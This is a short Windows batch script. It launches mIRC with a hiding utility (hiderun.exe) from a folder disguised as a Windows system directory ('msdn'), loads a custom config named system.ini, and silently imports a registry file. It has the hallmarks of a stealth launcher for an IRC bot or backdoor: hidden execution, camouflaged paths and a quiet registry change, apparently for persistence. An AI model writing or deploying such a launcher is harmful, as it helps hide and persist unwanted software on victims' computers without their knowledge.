@echo off
start c:\windows\system\msdn\hiderun.exe c:\windows\system\msdn\mirc.exe -r"C:/windows/system/msdn/" -i"C:/windows/system/msdn/system.ini"
regedit /s c:\windows\system\msdn\register.reg
@exit